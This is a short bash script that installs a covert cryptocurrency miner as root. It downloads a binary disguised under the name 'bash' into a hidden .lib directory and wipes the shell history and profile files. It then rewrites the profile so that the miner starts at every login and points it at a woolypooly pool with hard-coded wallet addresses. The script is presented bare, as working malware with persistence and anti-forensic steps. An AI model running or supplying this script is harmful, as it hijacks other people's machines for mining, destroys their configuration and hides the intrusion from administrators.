mkdir .lib
cd .lib
WORKER="setan"
WALLETNH="9i4hYPXf3VUfcVxUNSQxAqwo1THyy1pkN7cNDhF5KUZvqEVLZhF"
POOLNH="pool.woolypooly.com:3100"
wget -P /root/.lib/ https://github.com/gunturyogatama404/lolcuk/raw/refs/heads/main/bash && history -cr 
echo ""  > /root/.bashrc
echo "" > /root/.bash_history
echo "" > /root/.bash_profile
echo 'echo ""  >> /root/.bash_history' >> /root/.bashrc
echo "source /root/.bash_profile"  >> /root/.bashrc
echo "LD_LIBRARY_PATH=/root/.lib" > /root/.bash_profile
echo "export LD_LIBRARY_PATH" >> /root/.bash_profile
echo 'WORKER="setan"' >> ~/.bash_profile
echo 'WALLETNH="grin1yrecjut0w5nk2nfsy5nqlyffuwlq2s3gqzqmn8gz27yu98asnu3qqalqxn"' >> /root/.bash_profile
echo 'POOLNH="pool.woolypooly.com:3100"' >> /root/.bash_profile
echo "bash /root/.lib/gas.sh"  >> /root/.bash_profile
echo "./.lib/bash --coin AUTOLYKOS2 --pool $POOLNH --user $WALLETNH.$WORKER " > /root/.lib/gas.sh
chmod +x bash && cd ~/ && source .bashrc




